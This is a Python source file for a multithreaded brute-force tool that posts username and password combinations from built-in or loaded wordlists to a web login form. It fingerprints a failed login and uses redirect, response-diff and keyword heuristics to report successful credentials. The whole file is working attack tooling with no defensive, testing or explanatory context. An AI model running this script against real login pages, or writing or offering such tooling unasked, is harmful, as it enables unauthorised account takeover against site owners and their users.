import requests
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import urlparse, urlencode


class BruteForcer:
    def __init__(self, url, users=None, passwords=None, form=None, threads=10):
        self.url = url
        self.users = self.load_wordlist(users) if users else ["admin", "root", "test", "administrator", "user"]
        self.passwords = self.load_wordlist(passwords) if passwords else [
            "password", "123456", "admin", "admin123", "password1", "letmein", "welcome", "1234", "qwerty"
        ]
        self.form = form or "user={}&pass={}"
        self.threads = threads
        self.results = []
        self.found_event = None

    def load_wordlist(self, path):
        with open(path) as f:
            return [line.strip() for line in f if line.strip() and not line.startswith("#")]

    def _detect_failure_string(self):
        """Probe a known-bad login to fingerprint what failure looks like."""
        try:
            data = self.form.format("__invalid_user_xzqq__", "__invalid_pass_xzqq__")
            r = requests.post(self.url, data=data,
                              headers={"Content-Type": "application/x-www-form-urlencoded"}, timeout=5)
            return r.text[:4096]
        except Exception:
            return ""

    def try_credentials(self, user, password, failure_fingerprint=None):
        data_str = self.form.format(user, password)
        headers = {"Content-Type": "application/x-www-form-urlencoded"}
        try:
            r = requests.post(self.url, data=data_str, headers=headers, timeout=5, allow_redirects=True)

            # Heuristic: redirect after POST usually means success
            is_redirect_success = r.history and r.status_code == 200

            # Fingerprint-diff approach: response differs from known-fail
            looks_different = (
                failure_fingerprint and
                r.text[:4096] != failure_fingerprint
            )

            # Keyword approach: no failure keywords present
            fail_keywords = ["invalid", "incorrect", "wrong", "failed", "error", "try again", "denied"]
            no_fail_keywords = not any(kw in r.text.lower() for kw in fail_keywords)

            if is_redirect_success or (no_fail_keywords and looks_different):
                result = {"user": user, "password": password, "status": "success", "url": self.url}
                self.results.append(result)
                print(f"[+] CREDENTIALS HIT: {user}:{password} @ {self.url}")
        except Exception:
            pass

    def attack(self):
        print(f"[*] BruteForce: {self.url} | {len(self.users)} users x {len(self.passwords)} passwords")
        failure_fingerprint = self._detect_failure_string()

        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            for user in self.users:
                for password in self.passwords:
                    executor.submit(self.try_credentials, user, password, failure_fingerprint)

        if not self.results:
            print("[-] No valid credentials found.")
        return self.results
